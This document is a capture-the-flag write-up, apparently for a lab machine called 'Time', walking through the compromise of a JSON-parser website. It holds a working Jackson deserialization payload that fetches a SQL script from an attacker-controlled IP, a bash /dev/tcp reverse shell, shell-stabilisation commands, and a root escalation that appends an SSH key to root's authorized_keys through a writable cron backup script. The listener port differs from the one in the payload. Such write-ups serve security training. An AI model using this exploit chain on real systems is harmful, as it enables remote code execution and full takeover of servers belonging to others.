# time

nmap
-----
```
Nmap scan report for 10.10.10.214
Host is up (0.043s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/3%OT=22%CT=1%CU=39776%PV=Y%DS=2%DC=T%G=Y%TM=5FF1F039
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   45.51 ms 10.10.14.1
2   45.60 ms 10.10.10.214
```


The website
-----
![Image](images/img1.png?raw=true)

As we can see the site using fasterxml to parse the json input.


Possible vulnerabilities
-----
https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json


user shell
-----

Jackson gadgets - Anatomy of a vulnerability.

https://blog.doyensec.com/2019/07/22/jackson-gadgets.html


JSON input for triggering the reverse shell:
```
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.34:8000/inject.sql'"}]"
```

inject.sql
```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.37/1337 0>&1')
```

1. Start an http server for inject.sql
```
python3 -m http.server
```

2. Start nc to catch the reverse shell
```
nc -nvlp 4444
```

3. Use the JSON input on the site. (Choose the "Validate beta!" mode)

4. Stabilize the shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl-z

stty raw -echo

fg

reset

xterm
```
![Image](images/img2.png?raw=true)


root shell
-----

We can use pspy64 to see what processes are running.

```
2021/01/03 17:07:01 CMD: UID=0    PID=9994   | zip -r website.bak.zip /var/www/html
2021/01/03 17:07:01 CMD: UID=0    PID=9993   | /bin/bash /usr/bin/timer_backup.sh
2021/01/03 17:07:02 CMD: UID=0    PID=9995   | mv website.bak.zip /root/backup.zip
```

There is a scheduled crontab job which is running a backup script as root.\
Every command is executed with root permissions inside the timer_backup.sh

1. generate an ssh key

2. Add the the following line to timer_backup.sh with your own public key.
```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN/SZ4pTmGLtk8FkFtfml9/mwtlG7XlBqjON9KT05kzE root@noobie" >> /root/.ssh/authorized_keys
```
![Image](images/img3.png?raw=true)

3. ssh in as root.

![Image](images/img4.png?raw=true)
